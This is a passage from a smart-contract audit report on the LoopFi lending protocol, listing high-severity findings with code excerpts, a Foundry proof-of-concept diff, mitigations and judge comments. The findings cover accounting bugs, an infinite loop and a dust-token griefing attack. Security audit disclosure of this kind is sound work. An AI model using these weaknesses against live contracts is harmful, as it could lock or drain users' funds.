> >>>            uint256 newReward = (lastTimeRewardApplicable(rewardToken) - rewardData[rewardToken].lastUpdateTime)
>                 * rewardData[rewardToken].rewardPerSecond;
>             rptStored = rptStored + ((newReward * 1e18) / lockedSupplyWithMultiplier);
>         }
> ```
>
> As the new reward is calculated based on the `lastUpdateTime` which will wrongly be updated anytime `vestTokens` is called. 
> 
> He'll be calling `getReward` which updates the rewards (`_updateReward(msg.sender);`). When the user actually calls `getReward` the period between the time of calling `vestTokens` and the last time `_updateReward` was executed will actually be skipped because of the wrong storage update.
> As a result, anytime `vestTokens` is called, the `notifyReward` will skip reward periods erasing rewards, which is indeed a valid High.

***

## [[H-09] `decreaseLever` uses incorrect position address when withdrawing](https://github.com/code-423n4/2024-07-loopfi-findings/issues/116)
*Submitted by [hash](https://github.com/code-423n4/2024-07-loopfi-findings/issues/116), also found by [0xAlix2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/513), [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/82), and [nnez](https://github.com/code-423n4/2024-07-loopfi-findings/issues/41)*

`decreaseLever` will always revert for `Position4626` associated vaults.

### Proof of Concept

When decreasing lever, the control is passed over to the actual implementation contract for the `flashLoan` execution:

```solidity
    function decreaseLever(
        LeverParams calldata leverParams,
        uint256 subCollateral,
        address residualRecipient
    ) external onlyDelegatecall {
       
       ....

        // @audit execution passed to the implementation contract by setting it as the callback 
        // take out credit flash loan
        IPermission(leverParams.vault).modifyPermission(leverParams.position, self, true);
        uint loanAmount = leverParams.primarySwap.amount;
        flashlender.creditFlashLoan(
            ICreditFlashBorrower(self),
            loanAmount,
            abi.encode(leverParams, subCollateral, residualRecipient)
        );
        IPermission(leverParams.vault).modifyPermission(leverParams.position, self, false);       
```

Inside the `onCreditFlashLoan` call, it attempts to withdraw the collateral of the passed in position by the passed in `subCollateral` amount:

```solidity
    function onCreditFlashLoan(
        address /*initiator*/,
        uint256 /*amount*/,
        uint256 /*fee*/,
        bytes calldata data
    ) external returns (bytes32) {
        

        // sub collateral and debt
        ICDPVault(leverParams.vault).modifyCollateralAndDebt(
            leverParams.position,
            address(this),
            address(this),
            0,
            -toInt256(subDebt)
        );

        // withdraw collateral and handle any CDP specific actions
        // @audit should withdraw `subCollateral` amount from `leverParams.position`
=>      uint256 withdrawnCollateral = _onDecreaseLever(leverParams, subCollateral);
```

But the `_onDecreaseLever` function of the `Position4626` contract is flawed as it attempts to withdraw the collateral from its own address instead of the passed in `position`:

```solidity
    function _onDecreaseLever(
        LeverParams memory leverParams,
        uint256 subCollateral
    ) internal override returns (uint256 tokenOut) {
        // @audit attempts to withdraw from address(this) rather than leverParams.position
=>      uint256 withdrawnCollateral = ICDPVault(leverParams.vault).withdraw(address(this), subCollateral);
```

Since the collateral is actually present in the passed in position, this attempt to withdraw will  cause the call to revert.

### Recommended Mitigation Steps

Inside `_onDecreaseLever`, withdraw from `leverParams.position` instead.

**[Koolex (judge) increased severity to High](https://github.com/code-423n4/2024-07-loopfi-findings/issues/116#issuecomment-2386505529)**

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/116#event-15616256917)**

***

## [[H-10] Debt position interest is compounded while pool interest is simple causing inconsistency between `expectedLiquidity_` and `availableLiquidity_`](https://github.com/code-423n4/2024-07-loopfi-findings/issues/95)
*Submitted by [hash](https://github.com/code-423n4/2024-07-loopfi-findings/issues/95), also found by [Afriauditor](https://github.com/code-423n4/2024-07-loopfi-findings/issues/352) and [monrel](https://github.com/code-423n4/2024-07-loopfi-findings/issues/280)*

Borrower's will mostly end up paying more than the required amount of interest. This can also lead to lowered borrowing interest rates and final withdrawals to revert due to the inconsistency between the expected interest amount and the actually paid interest amount.

### Proof of Concept

The interest associated with a debt is calculated both in the pool and the user's debt position. However, the used method for calculation leads to different values between the pool and the debt position. In the pool it is simple linear interest, while for the debt position, the interest gets compounded.

In the pool the interest is calculated as `borrowed * interestRate * (elapsedTime/365 days)`:

[PoolV3.sol#L671-L673](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/PoolV3.sol#L671-L673)

```solidity
    function _calcBaseInterestAccrued(uint256 timestamp) private view returns (uint256) {
        return (_totalDebt.borrowed * baseInterestRate().calcLinearGrowth(timestamp)) / RAY;
    }
```

In the CDP vault (i.e., user's debt position), the interest is calculated as `debt * interestIndexNow / interestIndexPast - debt`:

[CDPVault.sol#L478](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L478)

```solidity
    function _calcDebt(Position memory position) internal view returns (DebtData memory cdd) {
        
        ....

        cdd.accruedInterest = CreditLogic.calcAccruedInterest(cdd.debt, cdd.cumulativeIndexLastUpdate, index);
```

[CreditLogic.sol#L31-L38](https://github.com/Gearbox-protocol/core-v3/blob/832fe64d7194ad74b93543b1314da38aa6d413ea/contracts/libraries/CreditLogic.sol#L31-L38)

```solidity
    function calcAccruedInterest(uint256 amount, uint256 cumulativeIndexLastUpdate, uint256 cumulativeIndexNow)
        internal
        pure
        returns (uint256)
    {
        if (amount == 0) return 0;
        return (amount * cumulativeIndexNow) / cumulativeIndexLastUpdate - amount; // U:[CL-1]
    }
```

Where the `interestIndex` is updated as follows:

[PoolV3.sol#L676-L678](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/PoolV3.sol#L676-L678)

```solidity
    function _calcBaseInterestIndex(uint256 timestamp) private view returns (uint256) {
        return (_baseInterestIndexLU * (RAY + baseInterestRate().calcLinearGrowth(timestamp))) / RAY;
    }
```

Hence, the `interestIndex` gets compounded with every invocation of `_calcBaseInterestIndex`, eventually causing a higher interest for the debt position when compared with the pool calculation. This also causes incorrectness between `expectedLiquidity_` and `availableLiquidity_` (i.e., `expectedLiquidity_` will be less than `availableLiquidity_`).

The correct relation between `expectedLiquidity_` and `availableLiquidity_` is required for `_updateBaseInterest` which is used throughout the contract for purposes like withdrawals:

```solidity
    function _withdraw(
        address receiver,
        address owner,
        uint256 assetsSent,
        uint256 assetsReceived,
        uint256 amountToUser,
        uint256 shares
    ) internal {
        if (msg.sender != owner) _spendAllowance({owner: owner, spender: msg.sender, amount: shares}); // U:[LP-8,9]
        _burn(owner, shares); // U:[LP-8,9]


        _updateBaseInterest({
            expectedLiquidityDelta: -assetsSent.toInt256(),
            availableLiquidityDelta: -assetsSent.toInt256(),
            checkOptimalBorrowing: false
        }); // U:[LP-8,9]
```

If the associated shares with the excess interest are withdrawn, it will cause an underflow for `expectedLiquidity` during final withdrawals

### POC Code

Apply the following diff and run `forge test --mt testHash_CompoundingVsSimpleInterest`. It is asserted that the calculated interest in the position is more than in the pool and that final withdrawals can revert due to this. The `minRate == 0` check in GaugeV3 contract is commented out in order to keep `quotaInterest` to 0 so that the only interest being accrued is the base interest, which will make it easier for displaying the difference in its calculation.

<details>

```solidity
diff --git a/src/quotas/GaugeV3.sol b/src/quotas/GaugeV3.sol
index e16d6dc..00574a9 100644
--- a/src/quotas/GaugeV3.sol
+++ b/src/quotas/GaugeV3.sol
@@ -303,9 +303,9 @@ contract GaugeV3 is IGaugeV3, ACLNonReentrantTrait {
 
     /// @dev Checks that given min and max rate are correct (`0 < minRate <= maxRate`)
     function _checkParams(uint16 minRate, uint16 maxRate) internal pure {
-        if (minRate == 0 || minRate > maxRate) {
-            revert IncorrectParameterException(); // U:[GA-04]
-        }
+        // if (minRate == 0 || minRate > maxRate) {
+        //     revert IncorrectParameterException(); // U:[GA-04]
+        // }
     }
 
     /// @notice Whether token is added to the gauge as quoted
diff --git a/src/test/unit/CDPVault.t.sol b/src/test/unit/CDPVault.t.sol
index 85c82ca..6e324a1 100644
--- a/src/test/unit/CDPVault.t.sol
+++ b/src/test/unit/CDPVault.t.sol
@@ -166,6 +166,81 @@ contract CDPVaultTest is TestBase {
         assertEq(credit, 50 ether);
     }
 
+    function HashCreateGaugeAndSetGauge(address vault) internal virtual {
+        address token_ = address(CDPVault(vault).token());
+        HashCreateGaugeAndSetGauge(vault, token_);
+    }
+
+    function HashCreateGaugeAndSetGauge(address vault, address token_) internal virtual {
+        quotaKeeper.setCreditManager(address(token_), address(vault));
+        if (!gauge.isTokenAdded(address(token_))) {
+            gauge.addQuotaToken(address(token_), 0, 1);
+        }
+        gauge.setFrozenEpoch(false);
+        vm.warp(block.timestamp + 1 weeks);
+        vm.prank(address(gauge));
+        quotaKeeper.updateRates();
+    }
+
+    function testHash_CompoundingVsSimpleInterest() public {
+        CDPVault vault = createCDPVault(token, 100 ether, 10 ether, 1.25 ether, 1.0 ether, 0);
+        // the qouta interest is set to 0
+        HashCreateGaugeAndSetGauge(address(vault));
+        token.mint(address(this), 100 ether);
+        token.approve(address(vault), 100 ether);
+        address position = address(new PositionOwner(vault));
+        vault.deposit(position, 100 ether);
+
+        uint quotaRevenue = liquidityPool.quotaRevenue();
+        assert(quotaRevenue == 0);
+
+        uint initialExpectedAmount = liquidityPool.expectedLiquidity();
+
+        vault.borrow(address(this), position, 50 ether);
+
+        // first interest index update
+        vm.warp(block.timestamp + 1 days);
+        liquidityPool.deposit(0,address(this));
+        // second interest index update
+        vm.warp(block.timestamp + 1 days);
+        liquidityPool.deposit(0,address(this));
+
+        // quota revenue is 0
+        quotaRevenue = liquidityPool.quotaRevenue();
+        assert(quotaRevenue == 0);
+        
+        uint newExpectedAmount = liquidityPool.expectedLiquidity();
+        uint poolAccruedInterest = newExpectedAmount - initialExpectedAmount;
+
+        (uint256 debt, uint256 positionAccruedInterest, uint256 cumulativeQuotaInterest)=vault.getDebtInfo(position);
+        
+        assert(debt == 50 ether);
+        assert(cumulativeQuotaInterest == 0);
+        assert(positionAccruedInterest > poolAccruedInterest);
+
+        // this additional interest will is not accounted in the expected interest
+
+        mockWETH.mint(address(this), debt + positionAccruedInterest);
+        mockWETH.approve(address(vault), debt + positionAccruedInterest);
+        vault.repay(address(this),position,debt + positionAccruedInterest);
+
+        // attempt to withdraw all the tokens from the pool will revert since the expectedAmount will underflow
+        {
+        liquidityPool.setLock(false);
+        uint balTreasury = liquidityPool.balanceOf(treasury);
+        uint balThis = liquidityPool.balanceOf(address(this));
+        assert(balTreasury + balThis == liquidityPool.totalSupply());
+
+        vm.prank(treasury);
+        liquidityPool.withdraw(balTreasury,treasury,treasury);
+
+        vm.expectRevert("SafeCast: value must be positive");
+        liquidityPool.withdraw(balThis,address(this),address(this));
+        }
+        
+
+    }
+
     function test_modifyCollateralAndDebt_depositCollateralAndDrawDebt() public {
         CDPVault vault = createCDPVault(token, 150 ether, 0, 1.25 ether, 1.0 ether, 0);
         createGaugeAndSetGauge(address(vault));
```

</details>

#### Recommended Mitigation Steps

Change the index updation to align with the pool calculation (i.e., `interestIndex = prevInterestIndex + baseInterest * timeElapsed`.

### Assessed type

Math

**[0xtj24 (LoopFi) acknowledged](https://github.com/code-423n4/2024-07-loopfi-findings/issues/95#event-14304042997)**

**[Koolex (judge) increased severity to High](https://github.com/code-423n4/2024-07-loopfi-findings/issues/95#issuecomment-2441561168)**

***

## [[H-11] It is nearly impossble for Liquidators to use `liquidatePosition()` to fully pay off a non bad-debt position](https://github.com/code-423n4/2024-07-loopfi-findings/issues/62)
*Submitted by [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/62), also found by [Evo](https://github.com/code-423n4/2024-07-loopfi-findings/issues/573)*

First, we need to know how liquidation of a non bad-debt position works. The liquidator passes the amount `repayAmount`, pays a penalty, and buys the position collateral at a discount price.

The issue here is after deducting the penalty, the `repayAmount` must be exactly equal to the amount of debt at the current second in order to completely pay off the debt. Aligning with the code, this means the `repayAmount * liquidationPenalty` must be equal to `calcTotalDebt(debtData)`. If it is larger, the liquidation would fail due to integer underflow in `calcDecrease()`.

However, since the result of `calcTotalDebt(debtData)` is increasing as time passes, and the transaction cannot pinpoint which second it is executed, the liquidator cannot know the amount of `calcTotalDebt(debtData)`.

This means it is nearly impossible for liquidators to fully pay off the non bad-debt position, which is unexpected.

```solidity
    function liquidatePosition(address owner, uint256 repayAmount) external whenNotPaused {
        // validate params
        if (owner == address(0) || repayAmount == 0) revert CDPVault__liquidatePosition_invalidParameters();

        // load configs
        VaultConfig memory config = vaultConfig;
        LiquidationConfig memory liqConfig_ = liquidationConfig;

        // load liquidated position
        Position memory position = positions[owner];
        DebtData memory debtData = _calcDebt(position);

        // load price and calculate discounted price
        uint256 spotPrice_ = spotPrice();
        uint256 discountedPrice = wmul(spotPrice_, liqConfig_.liquidationDiscount);
        if (spotPrice_ == 0) revert CDPVault__liquidatePosition_invalidSpotPrice();
        // Ensure that there's no bad debt
        if (calcTotalDebt(debtData) > wmul(position.collateral, spotPrice_)) revert CDPVault__BadDebt();

        // compute collateral to take, debt to repay and penalty to pay
        uint256 takeCollateral = wdiv(repayAmount, discountedPrice);
        uint256 deltaDebt = wmul(repayAmount, liqConfig_.liquidationPenalty);
        uint256 penalty = wmul(repayAmount, WAD - liqConfig_.liquidationPenalty);
        if (takeCollateral > position.collateral) revert CDPVault__tooHighRepayAmount();

        // verify that the position is indeed unsafe
        if (_isCollateralized(calcTotalDebt(debtData), wmul(position.collateral, spotPrice_), config.liquidationRatio))
            revert CDPVault__liquidatePosition_notUnsafe();

        // transfer the repay amount from the liquidator to the vault
        poolUnderlying.safeTransferFrom(msg.sender, address(pool), repayAmount - penalty);

        uint256 newDebt;
        uint256 profit;
        uint256 maxRepayment = calcTotalDebt(debtData);
        uint256 newCumulativeIndex;
>       if (deltaDebt == maxRepayment) {
            newDebt = 0;
            newCumulativeIndex = debtData.cumulativeIndexNow;
            profit = debtData.accruedInterest;
            position.cumulativeQuotaInterest = 0;
        } else {
            // @auditnote: If deltaDebt > maxRepayment, the following code would underflow and revert.
>           (newDebt, newCumulativeIndex, profit, position.cumulativeQuotaInterest) = calcDecrease(
                deltaDebt, // delta debt
                debtData.debt,
                debtData.cumulativeIndexNow, // current cumulative base interest index in Ray
                debtData.cumulativeIndexLastUpdate,
                debtData.cumulativeQuotaInterest
            );
        }
        position.cumulativeQuotaIndexLU = debtData.cumulativeQuotaIndexNow;
        // update liquidated position
        position = _modifyPosition(owner, position, newDebt, newCumulativeIndex, -toInt256(takeCollateral), totalDebt);

        pool.repayCreditAccount(debtData.debt - newDebt, profit, 0); // U:[CM-11]
        // transfer the collateral amount from the vault to the liquidator
        token.safeTransfer(msg.sender, takeCollateral);

        // Mint the penalty from the vault to the treasury
        poolUnderlying.safeTransferFrom(msg.sender, address(pool), penalty);
        IPoolV3Loop(address(pool)).mintProfit(penalty);

        if (debtData.debt - newDebt != 0) {
            IPoolV3(pool).updateQuotaRevenue(_calcQuotaRevenueChange(-int(debtData.debt - newDebt))); // U:[PQK-15]
        }
    }
```

### Recommended Mitigation Steps

Add a check where if `deltaDebt > maxRepayment`, set the `deltaDebt` to `maxRepayment`, and reverse calculate the `repayAmount` by `maxRepayment / liquidationPenalty`.

**[0xtj24 (LoopFi) disputed and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/62#issuecomment-2340783796):**
 > Liquidator can estimate the exact debt with:
 >
> ``` solidity
>   /// @notice Returns the total debt of a position
>     /// @param position Address of the position
>     /// @return totalDebt Total debt of the position [wad]
>     function virtualDebt(address position) external view returns (uint256) {
>         return calcTotalDebt(_calcDebt(positions[position]));
>     }
> ```
> and thus repaying the exact position's debt.

**[Koolex (judge) increased severity to High and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/62#issuecomment-2385246655):**
 > > However, since the result of `calcTotalDebt`(`debtData`) is increasing as time passes, and the transaction cannot pinpoint which second it is executed, the liquidator cannot know the amount of `calcTotalDebt`(`debtData`).
> 
> While Liquidator can estimate the exact debt with `virtualDebt`, there is a time window between the transaction sent and processed, during this, the debt could increase. Over time, bad debt will accumulate. 

**[0xAlix2 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/62#issuecomment-2391902900):**
> > While Liquidator can estimate the exact debt with virtualDebt, there is a time window between the transaction sent and processed, during this, the debt could increase. Over time, bad debt will accumulate.
> 
> @Koolex - I agree with this; however, this could be considered a user error. Since a user could simply call `liquidatePosition(position, virtualDebt(position))`, the mentioned scenario won't happen, and everything will work as expected.
> 
> Hence, I believe this is a valid low.

**[pkqs90 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/62#issuecomment-2392946763):**
 > @0xAlix2 - The point is due to the nature of blockchain, there is a time window between initiation of a transaction and execution of transaction. The initiation of a transaction most likely happen through a frontend request, and not by some blockchain code.

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/62#issuecomment-2408953884):**
 > Thank you for the feedback. No mitigation on the front-end could mitigate this. Any suggested mitigation can protect is on-chain. Stays as-is.

***

## [[H-12] `CDPVault.sol#liquidatePositionBadDebt()` should not set profit `= 0` when calling `pool.repayCreditAccount()`](https://github.com/code-423n4/2024-07-loopfi-findings/issues/57)
*Submitted by [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/57), also found by [hearmen](https://github.com/code-423n4/2024-07-loopfi-findings/issues/503)*

<https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L624>

<https://github.com/code-423n4/2024-07-loopfi/blob/main/src/PoolV3.sol#L529-L576>

### Impact

`CDPVault.sol#liquidatePositionBadDebt()` should not set profit `= 0` when calling `pool.repayCreditAccount()`, as this would cause a loss of funds to lpETH stakers.

### Bug Description

First we need to understand how `liquidatePositionBadDebt()` works. When there is a bad debt detected for a position, any liquidator can come and liquidate the position. The liquidator is required to buy ALL the collateral at a discount price, and the loss (`totalDebt - repayAmount`) is sent to PoolV3 to be beared by the lpETH stakers.

This is all good, but the issue here is that when the liquidator repays the debt, it is compared against the `totalDebt` of the position, which includes the interest. This interest should also be sent to the lpETH stakers, but is currently not, which would result in loss of funds for the lpETH stakers.

An example:

1. CDPVault position has debt principal `== 100`0, debt interest `== 500`. Total debt `== 1500`. Collateral value `== 1600`, discount `== 90%`, discount value `== 1440`.
2. Liquidator comes and pay off 1440, loss is `1500-1440 = 60`, so `pool.repayCreditAccount(1000, 0, 60)` is called.
3. The loss is 60, and the same amount of lpETH is burned from the StakingLPEth contract.

However, the issue here is, the liquidator also paid off 440 of debt interest, and is not sent to the StakingLPEth as profit. This means the 440 amount of underlying token (WETH) would be stuck in PoolV3, with no lpETH to redeem it.

Note that the current implementation is similar to GearboxV3. However, the profit concept is completely different, so it is incorrect for LoopFi.

`CDPVault.sol`:

```solidity
    function liquidatePositionBadDebt(address owner, uint256 repayAmount) external whenNotPaused {
        // validate params
        if (owner == address(0) || repayAmount == 0) revert CDPVault__liquidatePosition_invalidParameters();

        // load configs
        VaultConfig memory config = vaultConfig;
        LiquidationConfig memory liqConfig_ = liquidationConfig;

        // load liquidated position
        Position memory position = positions[owner];
        DebtData memory debtData = _calcDebt(position);
        uint256 spotPrice_ = spotPrice();
        if (spotPrice_ == 0) revert CDPVault__liquidatePosition_invalidSpotPrice();
        // verify that the position is indeed unsafe
        if (_isCollateralized(calcTotalDebt(debtData), wmul(position.collateral, spotPrice_), config.liquidationRatio))
            revert CDPVault__liquidatePosition_notUnsafe();

        // load price and calculate discounted price
        uint256 discountedPrice = wmul(spotPrice_, liqConfig_.liquidationDiscount);
        // Ensure that the debt is greater than the collateral at discounted price
        if (calcTotalDebt(debtData) <= wmul(position.collateral, discountedPrice)) revert CDPVault__noBadDebt();
        // compute collateral to take, debt to repay
        uint256 takeCollateral = wdiv(repayAmount, discountedPrice);
        if (takeCollateral < position.collateral) revert CDPVault__repayAmountNotEnough();

        // account for bad debt
        takeCollateral = position.collateral;
        repayAmount = wmul(takeCollateral, discountedPrice);
        uint256 loss = calcTotalDebt(debtData) - repayAmount;

        // transfer the repay amount from the liquidator to the vault
        poolUnderlying.safeTransferFrom(msg.sender, address(pool), repayAmount);

        position.cumulativeQuotaInterest = 0;
        position.cumulativeQuotaIndexLU = debtData.cumulativeQuotaIndexNow;
        // update liquidated position
        position = _modifyPosition(
            owner,
            position,
            0,
            debtData.cumulativeIndexNow,
            -toInt256(takeCollateral),
            totalDebt
        );

@>      pool.repayCreditAccount(debtData.debt, 0, loss); // U:[CM-11]
        // transfer the collateral amount from the vault to the liquidator
        token.safeTransfer(msg.sender, takeCollateral);

        int256 quotaRevenueChange = _calcQuotaRevenueChange(-int(debtData.debt));
        if (quotaRevenueChange != 0) {
            IPoolV3(pool).updateQuotaRevenue(quotaRevenueChange); // U:[PQK-15]
        }
    }
```

`PoolV3.sol`:

```solidity
    function repayCreditAccount(
        uint256 repaidAmount,
        uint256 profit,
        uint256 loss
    )
        external
        override
        creditManagerOnly // U:[LP-2C]
        whenNotPaused // U:[LP-2A]
        nonReentrant // U:[LP-2B]
    {
        uint128 repaidAmountU128 = repaidAmount.toUint128();

        DebtParams storage cmDebt = _creditManagerDebt[msg.sender];
        uint128 cmBorrowed = cmDebt.borrowed;
        if (cmBorrowed == 0) {
            revert CallerNotCreditManagerException(); // U:[LP-2C,14A]
        }

>       if (profit > 0) {
>           _mint(treasury, convertToShares(profit)); // U:[LP-14B]
>       } else if (loss > 0) {
            address treasury_ = treasury;
            uint256 sharesInTreasury = balanceOf(treasury_);
            uint256 sharesToBurn = convertToShares(loss);
            if (sharesToBurn > sharesInTreasury) {
                unchecked {
                    emit IncurUncoveredLoss({
                        creditManager: msg.sender,
                        loss: convertToAssets(sharesToBurn - sharesInTreasury)
                    }); // U:[LP-14D]
                }
                sharesToBurn = sharesInTreasury;
            }
            _burn(treasury_, sharesToBurn); // U:[LP-14C,14D]
        }

        _updateBaseInterest({
            expectedLiquidityDelta: -loss.toInt256(),
            availableLiquidityDelta: 0,
            checkOptimalBorrowing: false
        }); // U:[LP-14B,14C,14D]

        _totalDebt.borrowed -= repaidAmountU128; // U:[LP-14B,14C,14D]
        cmDebt.borrowed = cmBorrowed - repaidAmountU128; // U:[LP-14B,14C,14D]

        emit Repay(msg.sender, repaidAmount, profit, loss); // U:[LP-14B,14C,14D]
    }
```

### Recommended Mitigation Steps

In CDPVault, change to `pool.repayCreditAccount(debtData.debt, debtData.accruedInterest, loss)`.

In PoolV3:

```diff
        if (profit > 0) {
            _mint(treasury, convertToShares(profit)); // U:[LP-14B]
+       }
+       if (loss > 0)
-       } else if (loss > 0) {
            ...
        }
```

**[0xtj24 (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/57#event-14197663834)**

***

## [[H-13] `Flashlender.sol#flashLoan()` should use `mintProfit()` to mint fees, as the current implementation may lead to locked up WETH in PoolV3](https://github.com/code-423n4/2024-07-loopfi-findings/issues/55)
*Submitted by [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/55), also found by [0xAlix2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/515), [hearmen](https://github.com/code-423n4/2024-07-loopfi-findings/issues/497), [web3km](https://github.com/code-423n4/2024-07-loopfi-findings/issues/483), [Bigsam](https://github.com/code-423n4/2024-07-loopfi-findings/issues/440), [lian886](https://github.com/code-423n4/2024-07-loopfi-findings/issues/426), [Infect3d](https://github.com/code-423n4/2024-07-loopfi-findings/issues/416), [Bauchibred](https://github.com/code-423n4/2024-07-loopfi-findings/issues/410), [crypticdefense](https://github.com/code-423n4/2024-07-loopfi-findings/issues/398), [Spearmint](https://github.com/code-423n4/2024-07-loopfi-findings/issues/344), [grearlake](https://github.com/code-423n4/2024-07-loopfi-findings/issues/309), [Ruhum](https://github.com/code-423n4/2024-07-loopfi-findings/issues/288), [karsar](https://github.com/code-423n4/2024-07-loopfi-findings/issues/177), and [hash](https://github.com/code-423n4/2024-07-loopfi-findings/issues/99)*

When using flashlender to create loans, there is small amount of fees. The fees are sent to PoolV3 and is spread out to the lpETH stakers.

The issue is, the current implementation uses `pool.repayCreditAccount()` to add the profit, by setting the `profit == fees`. This is incorrect, and the correct implementation should be to use `pool.mintProfit()` to send the fees.

Both implementation mints the extra fees as lpETH to the `StakingLPEth.sol` contract, which is correct. However, the current implementation does NOT update the `expectedLiquidity`, since it assumes the `profit` is a part of the interest that should be paid by debt borrowers, and is already included, which is incorrect.

We can see the `mintProfit()` function also adds the amount of fees to the `expectedLiquidity`, since this is a different kind of fees than debt interest.

The impact of this issue is that the WETH amount in PoolV3 would be larger than `expectedLiquidity`. Since lpETH:WETH is always 1:1, when users want to withdraw the WETH, it may revert due to underflow when updating `expectedLiquidity`. An example is:

1. Currently there is 100 lpETH, 100 WETH, `expectedLiquidity == 100` WETH inside PoolV3.
2. Flashloan fees of 10 WETH comes in, lpETH is 110 lpETH, WETH is 110 WETH, but `expectedLiquidity` is still 100 WETH.
3. All lpETH users try to withdraw their WETH. Note that there is enough WETH in PoolV3, but since during withdraw, the `expectedLiquidity` is also updated, so only 100 WETH is allow for withdraw, or else there would be an integer underflow.

Note that CDPVault also uses `mintProfit()` to send the extra liquidation penalty as profit to PoolV3.

<https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L569>

`Flashlender.sol`:

```solidity
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external override nonReentrant returns (bool) {
        if (token != address(underlyingToken)) revert Flash__flashLoan_unsupportedToken();
        uint256 fee = wmul(amount, protocolFee);
        uint256 total = amount + fee;

        pool.lendCreditAccount(amount, address(receiver));

        emit FlashLoan(address(receiver), token, amount, fee);

        if (receiver.onFlashLoan(msg.sender, token, amount, fee, data) != CALLBACK_SUCCESS)
            revert Flash__flashLoan_callbackFailed();

        // reverts if not enough Stablecoin have been send back
        underlyingToken.transferFrom(address(receiver), address(pool), total);
@>      pool.repayCreditAccount(total - fee, fee, 0);
        // @BUG. SHOULD USE pool.mintProfit().

        return true;
    }
```

`PoolV3.sol`:

```solidity
    function repayCreditAccount(
        uint256 repaidAmount,
        uint256 profit,
        uint256 loss
    )
        external
        override
        creditManagerOnly // U:[LP-2C]
        whenNotPaused // U:[LP-2A]
        nonReentrant // U:[LP-2B]
    {
        if (profit > 0) {
            _mint(treasury, convertToShares(profit)); // U:[LP-14B]
        } else if (loss > 0) {
            ...
        }
        _updateBaseInterest({
@>          expectedLiquidityDelta: -loss.toInt256(),
            availableLiquidityDelta: 0,
            checkOptimalBorrowing: false
        }); // U:[LP-14B,14C,14D]
    }

    function mintProfit(uint256 amount) external creditManagerOnly {
        _mint(treasury, amount);

        _updateBaseInterest({
@>          expectedLiquidityDelta: amount.toInt256(),
            availableLiquidityDelta: 0,
            checkOptimalBorrowing: false
        }); // U:[LP-14B,14C,14D]
    }



    function _withdraw(
        address receiver,
        address owner,
        uint256 assetsSent,
        uint256 assetsReceived,
        uint256 amountToUser,
        uint256 shares
    ) internal {
        if (msg.sender != owner) _spendAllowance({owner: owner, spender: msg.sender, amount: shares}); // U:[LP-8,9]
        _burn(owner, shares); // U:[LP-8,9]

        _updateBaseInterest({
>           expectedLiquidityDelta: -assetsSent.toInt256(),
>           availableLiquidityDelta: -assetsSent.toInt256(),
            checkOptimalBorrowing: false
        }); // U:[LP-8,9]
        // @INTEGER UNDERFLOW WOULD OCCUR HERE.

        IERC20(underlyingToken).safeTransfer({to: receiver, value: amountToUser}); // U:[LP-8,9]
        if (assetsSent > amountToUser) {
            unchecked {
                IERC20(underlyingToken).safeTransfer({to: treasury, value: assetsSent - amountToUser}); // U:[LP-8,9]
            }
        }
        emit Withdraw(msg.sender, receiver, owner, assetsReceived, shares); // U:[LP-8,9]
    }
```

### Recommended Mitigation Steps

Use `mintProfit()` to mint flashloan fees instead.

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/55#event-14319061745)**

***

## [[H-14] An infinite loop in `MultiFeeDistribution.sol` withdraw](https://github.com/code-423n4/2024-07-loopfi-findings/issues/20)
*Submitted by [novamanbg](https://github.com/code-423n4/2024-07-loopfi-findings/issues/20), also found by [novamanbg](https://github.com/code-423n4/2024-07-loopfi-findings/issues/21) and [0x40saoirse](https://github.com/code-423n4/2024-07-loopfi-findings/issues/424)*

An infinite loop will block the withdraw process.

### Proof of Concept

In the MultiFeeDistribution.sol the `withdraw` function will start going through user's locked amounts if they do not have enough unlocked to cover their withdraw request:

```solidity
  if (amount <= bal.unlocked) {
            bal.unlocked = bal.unlocked - amount;
        } else {
            uint256 remaining = amount - bal.unlocked;
            if (bal.earned < remaining) revert InvalidEarned();
            bal.unlocked = 0;
            uint256 sumEarned = bal.earned;
            uint256 i;
            for (i = 0; ; ) {
                uint256 earnedAmount = _userEarnings[_address][i].amount;
                if (earnedAmount == 0) continue;
```

However, as you can see it will stay at 0 and the following check will execute:

```solidity
  if (earnedAmount == 0) continue;
```

This continues and will start a new iteration of the loop; however, it will still be `0` and this loop will never end. As a result, claiming from locked amounts with penalty will not be possible.

### Recommended Mitigation Steps

Rewrite the code the following way:

```solidity
  if (earnedAmount == 0) {
i++;
continue;
}
```

### Assessed type

Loop

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/20#event-14360721485)**

***

## [[H-15] Directly sending dust token amount will slow down distribution in `MultiFeeDistribution.sol`](https://github.com/code-423n4/2024-07-loopfi-findings/issues/19)
*Submitted by [novamanbg](https://github.com/code-423n4/2024-07-loopfi-findings/issues/19)*

While sending a small amount and calling `getReward` is a typical example of griefing which is normally considered Medium. Given the low cost of the attack and that no specific external conditions need to be met as well as the high impact for all the users of the protocol I consider it High severity.

### Proof of Concept

The `_getReward` function in `MultiFeeDistribution.sol` will call `_notifyUnseenReward` which will execute the following:

```solidity
 uint256 unseen = IERC20(token).balanceOf(address(this)) - r.balance;
            if (unseen > 0) {
                _notifyReward(token, unseen);
            }
